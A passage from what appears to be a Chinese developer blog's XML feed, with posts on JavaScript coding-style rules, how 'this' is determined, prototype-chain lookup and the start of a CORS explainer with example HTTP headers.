title="计算属性的空格"></a>计算属性的空格</h3><p>团队约定在对象的计算属性内，禁止使用空格</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Bad */</span></span><br><span class="line">obj<span class="selector-attr">[<span class="string">&#x27;foo&#x27;</span> ]</span></span><br><span class="line">obj<span class="selector-attr">[ <span class="string">&#x27;foo&#x27;</span>]</span></span><br><span class="line">obj<span class="selector-attr">[ <span class="string">&#x27;foo&#x27;</span> ]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Good*/</span></span><br><span class="line">obj<span class="selector-attr">[<span class="string">&#x27;foo&#x27;</span>]</span></span><br></pre></td></tr></table></figure><h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>为了避免语法错误，团队约定在函数调用时，禁止使用空格</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Bad */</span></span><br><span class="line">fn ()</span><br><span class="line">fn</span><br><span class="line">()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Good*/</span></span><br><span class="line"><span class="built_in">fn</span>()</span><br></pre></td></tr></table></figure><h3 id="对象字面量的键值缩进"><a href="#对象字面量的键值缩进" class="headerlink" title="对象字面量的键值缩进"></a>对象字面量的键值缩进</h3><p>团队约定对象字面量的键和值之间不能存在空格，且要求对象字面量的冒号和值之间存在一个空格</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Bad */</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="string">&#x27;foo&#x27;</span> : <span class="string">&#x27;haha&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Good*/</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="string">&#x27;foo&#x27;</span>: <span class="string">&#x27;haha&#x27;</span> &#125;</span><br></pre></td></tr></table></figure><h3 id="构造函数首字母大写"><a href="#构造函数首字母大写" class="headerlink" title="构造函数首字母大写"></a>构造函数首字母大写</h3><p>在 JavaScript 中 <code>new</code> 操作符用来创建某个特定类型的对象的一个实例，该类型的对象是由一个构造函数表示的。由于构造函数只是常规函数，唯一区别是使用 <code>new</code> 来调用。所以我们团队约定构造函数的首字母要大小，以此来区分构造函数和普通函数。</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Bad */</span></span><br><span class="line"><span class="keyword">var</span> fooItem = <span class="keyword">new</span> <span class="type">foo</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Good*/</span></span><br><span class="line"><span class="keyword">var</span> fooItem = <span class="keyword">new</span> <span class="type">Foo</span>()</span><br></pre></td></tr></table></figure><h3 id="构造函数的参数"><a href="#构造函数的参数" class="headerlink" title="构造函数的参数"></a>构造函数的参数</h3><p>在 JavaScript 中，通过 <code>new</code> 调用构造函数时，如果不带参数，可以省略后面的圆括号。但这样会造成与整体的代码风格不一致，所以团队约定使用圆括号</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Bad */</span></span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> <span class="type">Person</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Good*/</span></span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> <span class="type">Person</span>()</span><br></pre></td></tr></table></figure><h3 id="链式调用"><a href="#链式调用" class="headerlink" title="链式调用"></a>链式调用</h3><p>链式调用如果放在同一行，往往会造成代码的可读性差，但有些时候，短的链式调用并不会影响美观。所以本规范约定一行最多只能有四个链式调用，超过就要求换行。</p><h3 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h3><p>空白行对于分离代码逻辑有帮助，但过多的空行会占据屏幕的空间，影响可读性。团队约定最大连续空行数为 2</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Bad */</span></span><br><span class="line"><span class="selector-tag">var</span> <span class="selector-tag">a</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">var</span> <span class="selector-tag">b</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Good*/</span></span><br><span class="line"><span class="selector-tag">var</span> <span class="selector-tag">a</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">var</span> <span class="selector-tag">b</span> = <span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="函数声明的空格"><a href="#函数声明的空格" class="headerlink" title="函数声明的空格"></a>函数声明的空格</h3><p>当格式化一个函数，函数名或 function 关键字与左括号之间允许有空白。命名函数要求函数名和 function 关键字之间有空格，但是匿名函数要求不加空格。</p><blockquote><p>团队约定函数括号前要加空格</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/* Bad */</span></span><br><span class="line"><span class="keyword">function</span> <span class="keyword">func</span>(x) &#123;</span><br><span class="line">  <span class="regexp">//</span> ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="regexp">/* Good*/</span></span><br><span class="line"><span class="keyword">function</span> <span class="keyword">func</span> (x) &#123;</span><br><span class="line">  <span class="regexp">//</span> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="操作符的空格"><a href="#操作符的空格" class="headerlink" title="操作符的空格"></a>操作符的空格</h3><p>团队约定操作符前后都需要添加空格</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Bad */</span></span><br><span class="line"><span class="keyword">var</span> <span class="built_in">sum</span> = <span class="number">1</span>+<span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Good*/</span></span><br><span class="line"><span class="keyword">var</span> <span class="built_in">sum</span> = <span class="number">1</span> + <span class="number">2</span></span><br></pre></td></tr></table></figure><hr><h1 id="编辑器配置"><a href="#编辑器配置" class="headerlink" title="编辑器配置"></a>编辑器配置</h1><p>将你的编辑器按照下面的配置进行设置，以避免常见的代码不一致和差异：</p><ul><li>用两个空格代替制表符（soft-tab 即用空格代表 tab 符）。</li><li>保存文件时，删除尾部的空白符。</li><li>设置文件编码为 UTF-8。</li><li>在文件结尾添加一个空白行。</li></ul><p>参照文档并将这些配置信息添加到项目的 <code>.editorconfig</code> 文件中。例如：<a href="https://github.com/twbs/bootstrap/blob/master/.editorconfig">Bootstrap 中的 .editorconfig 实例</a>。更多信息请参考 <a href="http://editorconfig.org/">about EditorConfig</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JS三大经典-this 的值</title>
      <link href="/Blog/2018/09/29/essay/JS%E4%B8%89%E5%A4%A7%E7%BB%8F%E5%85%B8-this%E7%9A%84%E5%80%BC/index/"/>
      <url>/Blog/2018/09/29/essay/JS%E4%B8%89%E5%A4%A7%E7%BB%8F%E5%85%B8-this%E7%9A%84%E5%80%BC/index/</url>
      
        <content type="html"><![CDATA[<h4 id="1-什么是-JS-原型链？"><a href="#1-什么是-JS-原型链？" class="headerlink" title="1. 什么是 JS 原型链？"></a>1. 什么是 JS 原型链？</h4><h4 id="2-this-的值到底是什么？"><a href="#2-this-的值到底是什么？" class="headerlink" title="2. this 的值到底是什么？"></a>2. this 的值到底是什么？</h4><h4 id="3-JS-的-new-到底是干什么的？"><a href="#3-JS-的-new-到底是干什么的？" class="headerlink" title="3. JS 的 new 到底是干什么的？"></a>3. JS 的 new 到底是干什么的？</h4><h6 id="这是-JS-里的三个经典概念，自学者必须学会，否则无法通过面试。"><a href="#这是-JS-里的三个经典概念，自学者必须学会，否则无法通过面试。" class="headerlink" title="这是 JS 里的三个经典概念，自学者必须学会，否则无法通过面试。"></a>这是 JS 里的三个经典概念，自学者必须学会，否则无法通过面试。</h6><h6 id="今天主要来说一说自己对JS-this-的值的理解。"><a href="#今天主要来说一说自己对JS-this-的值的理解。" class="headerlink" title="今天主要来说一说自己对JS this 的值的理解。"></a>今天主要来说一说自己对JS this 的值的理解。</h6><p>你可能遇到过这样的 JS 面试题：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var</span> obj = &#123;</span><br><span class="line">  foo: <span class="built_in">function</span>()&#123;</span><br><span class="line">    console<span class="selector-class">.log</span>(this)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">var</span> bar = obj<span class="selector-class">.foo</span></span><br><span class="line">obj<span class="selector-class">.foo</span>() <span class="comment">// 打印出的 this 是 obj</span></span><br><span class="line"><span class="function"><span class="title">bar</span><span class="params">()</span></span> <span class="comment">// 打印出的 this 是 window</span></span><br></pre></td></tr></table></figure><p>请解释最后两行函数的值为什么不一样。</p><hr><p>初学者关于 this 的理解一直很模糊。今天这篇文章就要一次讲清楚了。</p><p>有用请点赞。</p><h6 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h6><p>首先需要从函数的调用开始讲起。</p><p>JS（ES5）里面有三种函数调用形式：</p><blockquote><p>func(p1, p2)<br>obj.child.method(p1, p2)<br>func.call(context, p1, p2) &#x2F;&#x2F; 先不讲 apply</p></blockquote><p>一般，初学者都知道前两种形式，而且认为前两种形式「优于」第三种形式。</p><p>从看到这篇文章起，你一定要记住，第三种调用形式，才是正常调用形式：</p><blockquote><p>f unc.call(context, p1, p2)</p></blockquote><p>其他两种都是语法糖，可以等价地变为 call 形式：</p><blockquote><p>func(p1, p2) 等价于<br>func.call(undefined, p1, p2)</p><p>obj.child.method(p1, p2) 等价于<br>obj.child.method.call(obj.child, p1, p2)</p></blockquote><p>请记下来。（我们称此代码为「转换代码」，方便下文引用）</p><p>至此我们的函数调用只有一种形式：</p><blockquote><p>func.call(context, p1, p2)</p></blockquote><h5 id="这样，this-就好解释了"><a href="#这样，this-就好解释了" class="headerlink" title="这样，this 就好解释了"></a>这样，this 就好解释了</h5><p>this，就是上面代码中的 context。就这么简单。</p><p>this 是你 call 一个函数时传的 context，由于你从来不用 call 形式的函数调用，所以你一直不知道。</p><h6 id="先看-func-p1-p2-中的-this-如何确定："><a href="#先看-func-p1-p2-中的-this-如何确定：" class="headerlink" title="先看 func(p1, p2) 中的 this 如何确定："></a>先看 func(p1, p2) 中的 this 如何确定：</h6><p>当你写下面代码时</p><blockquote><p>function func(){<br>  console.log(this)<br>}</p><p>func()</p></blockquote><p>等价于</p><blockquote><p>function func(){<br>  console.log(this)<br>}</p><p>func.call(undefined) &#x2F;&#x2F; 可以简写为 func.call()</p></blockquote><blockquote><p>按理说打印出来的 this 应该就是 undefined 了吧，但是浏览器里有一条规则：<br>如果你传的 context 就 null 或者 undefined，那么 window 对象就是默认的 context（严格模式下默认 context 是 undefined）</p></blockquote><p>因此上面的打印结果是 window。</p><p>如果你希望这里的 this 不是 window，很简单：</p><blockquote><p>func.call(obj) &#x2F;&#x2F; 那么里面的 this 就是 obj 对象了</p></blockquote><h6 id="再看-obj-child-method-p1-p2-的-this-如何确定"><a href="#再看-obj-child-method-p1-p2-的-this-如何确定" class="headerlink" title="再看 obj.child.method(p1, p2) 的 this 如何确定"></a>再看 obj.child.method(p1, p2) 的 this 如何确定</h6><blockquote><p>var obj &#x3D; {<br>  foo: function(){<br>    console.log(this)<br>  }<br>}</p><p>obj.foo()</p></blockquote><p>按照「转换代码」，我们将 obj.foo() 转换为</p><blockquote><p>obj.foo.call(obj)</p></blockquote><p>好了，this 就是 obj。搞定。<br><br><br><br><br>回到题目：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var</span> obj = &#123;</span><br><span class="line">  foo: <span class="built_in">function</span>()&#123;</span><br><span class="line">    console<span class="selector-class">.log</span>(this)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">var</span> bar = obj<span class="selector-class">.foo</span></span><br><span class="line">obj<span class="selector-class">.foo</span>() <span class="comment">// 转换为 obj.foo.call(obj)，this 就是 obj</span></span><br><span class="line"><span class="function"><span class="title">bar</span><span class="params">()</span></span> </span><br><span class="line"><span class="comment">// 转换为 bar.call()</span></span><br><span class="line"><span class="comment">// 由于没有传 context</span></span><br><span class="line"><span class="comment">// 所以 this 就是 undefined</span></span><br><span class="line"><span class="comment">// 最后浏览器给你一个默认的 this —— window 对象</span></span><br></pre></td></tr></table></figure><h5 id="语法"><a href="#语法" class="headerlink" title="[ ] 语法"></a>[ ] 语法</h5><blockquote><p>function fn (){ console.log(this) }<br>var arr &#x3D; [fn, fn2]<br>arr<a href="">0</a> &#x2F;&#x2F; 这里面的 this 又是什么呢？</p></blockquote><p>我们可以把 arr<a href="">0</a> 想象为arr.0( )，虽然后者的语法错了，但是形式与转换代码里的 obj.child.method(p1, p2) 对应上了，于是就可以愉快的转换了：</p><blockquote><p>arr【0】()<br>假想为      arr.0()<br>然后转换为 arr.0.call(arr)<br>那么里面的 <strong>this</strong> 就是 arr 了 :)</p></blockquote><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul><li>this 就是你 call 一个函数时，传入的第一个参数。（请务必背下来「this 就是 call 的第一个参数」）</li><li>如果你的函数调用形式不是 call 形式，请按照「转换代码」将其转换为 call 形式。</li></ul><p>以后你遇到所有跟 this 有关的笔试题，都不会有疑问了。</p><p>完。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JS三大经典-原型链继承</title>
      <link href="/Blog/2018/09/28/essay/JS%E4%B8%89%E5%A4%A7%E7%BB%8F%E5%85%B8-%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%BB%A7%E6%89%BF/index/"/>
      <url>/Blog/2018/09/28/essay/JS%E4%B8%89%E5%A4%A7%E7%BB%8F%E5%85%B8-%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%BB%A7%E6%89%BF/index/</url>
      
        <content type="html"><![CDATA[<h4 id="1-什么是-JS-原型链？"><a href="#1-什么是-JS-原型链？" class="headerlink" title="1. 什么是 JS 原型链？"></a>1. 什么是 JS 原型链？</h4><h4 id="2-this-的值到底是什么？"><a href="#2-this-的值到底是什么？" class="headerlink" title="2. this 的值到底是什么？"></a>2. this 的值到底是什么？</h4><h4 id="3-JS-的-new-到底是干什么的？"><a href="#3-JS-的-new-到底是干什么的？" class="headerlink" title="3. JS 的 new 到底是干什么的？"></a>3. JS 的 new 到底是干什么的？</h4><h6 id="这是-JS-里的三个经典概念，自学者必须学会，否则无法通过面试。"><a href="#这是-JS-里的三个经典概念，自学者必须学会，否则无法通过面试。" class="headerlink" title="这是 JS 里的三个经典概念，自学者必须学会，否则无法通过面试。"></a>这是 JS 里的三个经典概念，自学者必须学会，否则无法通过面试。</h6><h6 id="今天主要来说一说自己对JS原型链继承的理解。"><a href="#今天主要来说一说自己对JS原型链继承的理解。" class="headerlink" title="今天主要来说一说自己对JS原型链继承的理解。"></a>今天主要来说一说自己对JS原型链继承的理解。</h6><p>我们知道 JS 有对象，比如</p><blockquote><p>var obj &#x3D; { name: ‘obj’ }</p></blockquote><p>我们可以对 obj 进行一些操作，包括</p><ul><li>「读」属性</li><li>「新增」属性</li><li>「更新」属性</li><li>「删除」属性<br>下面我们主要来看一下「读」和「新增」属性。</li></ul><h4 id="为什么有-valueOf-x2F-toString-属性呢？"><a href="#为什么有-valueOf-x2F-toString-属性呢？" class="headerlink" title="为什么有 valueOf &#x2F; toString 属性呢？"></a>为什么有 valueOf &#x2F; toString 属性呢？</h4><p>在我们没有对 obj 进行任何其他操作之前，发现 obj 已经有几个属性（方法）了：</p><p><img src="/Blog/2018/09/28/essay/JS%E4%B8%89%E5%A4%A7%E7%BB%8F%E5%85%B8-%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%BB%A7%E6%89%BF/index/img.png"></p><p><strong>那么问题来了：valueOf &#x2F; toString &#x2F; constructor 是怎么来？我们并没有给 obj.valueOf 赋值呀。</strong></p><p>要搞清楚 valueOf &#x2F; toString &#x2F; constructor 是怎么来的，就要用到 console.dir 了。</p><p><img src="/Blog/2018/09/28/essay/JS%E4%B8%89%E5%A4%A7%E7%BB%8F%E5%85%B8-%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%BB%A7%E6%89%BF/index/img_1.png"></p><p>我们发现 console.dir(obj) 打出来的结果是：</p><ol><li>obj 本身有一个属性 name（这是我们给它加的）</li><li>obj 还有一个属性叫做 __proto__（它是一个对象）</li><li>obj.<strong>proto</strong> 有很多属性，包括 valueOf、toString、constructor 等</li><li>obj.<strong>proto</strong> 其实也有一个叫做 <strong>proto</strong> 的属性（console.log 没有显示），值为 null<br>现在回到我们的问题：obj 为什么会拥有 valueOf &#x2F; toString &#x2F; constructor 这几个属性？</li></ol><p>答案：</p><p>这跟 <strong>proto</strong> 有关。<br>当我们「读取」 obj.toString 时，JS 引擎会做下面的事情：</p><ol><li>看看 obj 对象本身有没有 toString 属性。没有就走到下一步。</li><li>看看 obj.<strong>proto</strong> 对象有没有 toString 属性，发现 obj.<strong>proto</strong> 有 toString 属性，于是找到了<br>所以 obj.toString 实际上就是第 2 步中找到的 obj.<strong>proto</strong>.toString。<br>可以想象，</li><li>如果 obj.<strong>proto</strong> 没有，那么浏览器会继续查看 obj.<strong>proto</strong>.<strong>proto</strong></li><li>如果 obj.<strong>proto</strong>.<strong>proto</strong> 也没有，那么浏览器会继续查看 obj.<strong>proto</strong>.<strong>proto</strong>.proto__</li><li>直到找到 toString 或者 <strong>proto</strong> 为 null。<br>上面的过程，就是「读」属性的「搜索过程」。<br>而这个「搜索过程」，是连着由 <strong>proto</strong> 组成的链子一直走的。<br><em><strong>这个链子，就叫做「原型链」</strong></em>。</li></ol><h2 id="共享原型链"><a href="#共享原型链" class="headerlink" title="共享原型链"></a><strong>共享原型链</strong></h2><p>现在我们有另一个对象</p><blockquote><p>var obj2 &#x3D; { name: ‘obj2’ }</p></blockquote><p>如图：</p><p><img src="/Blog/2018/09/28/essay/JS%E4%B8%89%E5%A4%A7%E7%BB%8F%E5%85%B8-%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%BB%A7%E6%89%BF/index/img_2.png"></p><p>那么 obj.toString 和 obj2.toString 其实是同一个东西，也就是 obj2.<strong>proto</strong>.toString。</p><p>这有什么意义呢？</p><p>如果我们改写 obj2.<strong>proto</strong>.toString，那么 obj.toString 其实也会变！</p><p>这样 obj 和 obj2 就是具有某些相同行为的对象，这就是意义所在。</p><h2 id="差异化"><a href="#差异化" class="headerlink" title="差异化"></a><strong>差异化</strong></h2><p>如果我们想让 obj.toString 和 obj2.toString 的行为不同怎么做呢？</p><p>直接赋值就好了：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj.toString = <span class="keyword">function</span><span class="params">()</span>&#123; <span class="keyword">return</span> <span class="string">&#x27;新的 toString 方法&#x27;</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/Blog/2018/09/28/essay/JS%E4%B8%89%E5%A4%A7%E7%BB%8F%E5%85%B8-%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%BB%A7%E6%89%BF/index/img_3.png"></p><p>总结：</p><p>「读」属性时会<strong>沿着原型链搜索</strong>。</p><p>「新增」属性时<strong>不会</strong>去看原型链（但是如果你给这个属性加了一些配置，则不一样，以后讲）。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>跨域资源共享CORS详解</title>
      <link href="/Blog/2018/09/27/essay/%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%ABCORS%E8%AF%A6%E8%A7%A3/index/"/>
      <url>/Blog/2018/09/27/essay/%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%ABCORS%E8%AF%A6%E8%A7%A3/index/</url>
      
        <content type="html"><![CDATA[<p>CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。</p><p>它允许浏览器向跨源服务器，发出<a href="http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html">XMLHttpRequest</a>请求，从而克服了AJAX只能<a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html">同源</a>使用的限制。</p><p>本文详细介绍CORS的内部机制。</p><h5 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h5><p>CORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。</p><p>整个<strong>CORS</strong>通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，<strong>CORS</strong>通信与同源的<strong>AJAX</strong>通信没有差别，代码完全一样。浏览器一旦发现<strong>AJAX</strong>请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。</p><p>因此，实现<strong>CORS</strong>通信的关键是服务器。只要服务器实现了<strong>CORS</strong>接口，就可以跨源通信。</p><h5 id="二、两种请求"><a href="#二、两种请求" class="headerlink" title="二、两种请求"></a>二、两种请求</h5><p>浏览器将<strong>CORS</strong>请求分成两类：简单请求（<strong>simple request</strong>）和非简单请求（<strong>not-so-simple request</strong>）。</p><p>只要同时满足以下两大条件，就属于简单请求。</p><blockquote><p>（1) 请求方法是以下三种方法之一：<br>HEAD<br>GET<br>POST</p><p>（2）HTTP的头信息不超出以下几种字段：<br>Accept<br>Accept-Language<br>Content-Language<br>Last-Event-ID<br>Content-Type：只限于三个值application&#x2F;x-www-form-urlencoded、multipart&#x2F;form-data、text&#x2F;plain</p></blockquote><p>凡是不同时满足上面两个条件，就属于非简单请求。</p><p>浏览器对这两种请求的处理，是不一样的。<br>#####三、简单请求<br>######3.1 基本流程<br>对于简单请求，浏览器直接发出<strong>CORS</strong>请求。具体来说，就是在头信息之中，增加一个<strong>Origin</strong>字段。</p><p>下面是一个例子，浏览器发现这次跨源<strong>AJAX</strong>请求是简单请求，就自动在头信息之中，添加一个<strong>Origin</strong>字段。</p><blockquote><p>GET &#x2F;cors HTTP&#x2F;1.1<br>Origin: <a href="http://api.bob.com/">http://api.bob.com</a><br>Host: api.alice.com<br>Accept-Language: en-US<br>Connection: keep-alive<br>User-Agent: Mozilla&#x2F;5.0…</p></blockquote><p>上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</p><p>如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含<strong>Access-Control-Allow-Origin</strong>字段（详见下文），就知道出错了，从而抛出一个错误，被<strong>XMLHttpRequest</strong>的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。</p><p>如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p><blockquote><p>Access-Control-Allow-Origin: <a href="http://api.bob.com/">http://api.bob.com</a><br>Access-Control-Allow-Credentials: true<br>Access-Control-Expose-Headers: FooBar<br>Content-Type: text&#x2F;html; charset&#x3D;utf-8<br>上面的头信息之中，有三个与CORS请求相关的字段，都以Access-Control-开头。</p></blockquote><ul><li>（1）Access-Control-Allow-Origin</li></ul><p>该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。</p><ul><li>（2）Access-Control-Allow-Credentials</li></ul><p>该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。</p><ul><li>（3）Access-Control-Expose-Headers</li></ul><p>该字段可选。<strong>CORS</strong>请求时，<strong>XMLHttpRequest</strong>对象的<strong>getResponseHeader()<strong>方法只能拿到6个基本字段：</strong>Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma</strong>。如果想拿到其他字段，就必须在<strong>Access-Control-Expose-Headers</strong>里面指定。上面的例子指定，getResponseHeader(‘FooBar’)可以返回FooBar字段的值。</p><h6 id="3-2-withCredentials-属性"><a href="#3-2-withCredentials-属性" class="headerlink" title="3.2 withCredentials 属性"></a>3.2 withCredentials 属性</h6><p>上面说到，<strong>CORS</strong>请求默认不发送<strong>Cookie</strong>和<strong>HTTP</strong>认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定<strong>Access-Control-Allow-Credentials</strong>字段。</p><blockquote><p>Access-Control-Allow-Credentials: true<br>另一方面，开发者必须在AJAX请求中打开withCredentials属性。<br>var xhr &#x3D; new XMLHttpRequest();<br>xhr.withCredentials &#x3D; true;</p></blockquote><p>否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。</p><p>但是，如果省略withCredentials设置，有的浏览器还是会一起发送Cookie。这时，可以显式关闭withCredentials。</p><blockquote><p>xhr.withCredentials &#x3D; false;</p></blockquote><p>需要注意的是，如果要发送<strong>Cookie，Access-Control-Allow-Origin</strong>就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。</p><h5 id="四、非简单请求"><a href="#四、非简单请求" class="headerlink" title="四、非简单请求"></a>四、非简单请求</h5><h6 id="4-1-预检请求"><a href="#4-1-预检请求" class="headerlink" title="4.1 预检请求"></a>4.1 预检请求</h6><p>非简单请求是那种对服务器有特殊要求的请求，比如请求方法是<strong>PUT</strong>或<strong>DELETE</strong>，或者<strong>Content-Type</strong>字段的类型是<strong>application&#x2F;json</strong>。</p><p>非简单请求的<strong>CORS</strong>请求，会在正式通信之前，增加一次<strong>HTTP</strong>查询请求，称为”预检”请求（preflight）。</p><p>浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些<strong>HTTP</strong>动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的<strong>XMLHttpRequest</strong>请求，否则就报错。</p><p>下面是一段浏览器的JavaScript脚本。</p><blockquote><p>var url &#x3D; ‘<a href="http://api.alice.com/cors">http://api.alice.com/cors</a>‘;<br>var xhr &#x3D; new XMLHttpRequest();<br>xhr.open(‘PUT’, url, true);<br>xhr.setRequestHeader(‘X-Custom-Header’, ‘value’);<br>xhr.send();</p></blockquote><p>上面代码中，<strong>HTTP</strong>请求的方法是<strong>PUT</strong>，并且发送一个自定义头信息<strong>X-Custom-Header</strong>。</p><p>浏览器发现，这是一个非简单请求，就自动发出一个”预检”请求，要求服务器确认可以这样请求。下面是这个”预检”请求的HTTP头信息。</p><blockquote><p>OPTIONS &#x2F;cors HTTP&#x2F;1.1<br>Origin: <a href="http://api.bob.com/">http://api.bob.com</a><br>Access-Control-Request-Method: PUT<br>Access-Control-Request-Headers: X-Custom-Header<br>Host: api.alice.com<br>Accept-Language: en-US<br>Connection: keep-alive<br>User-Agent: 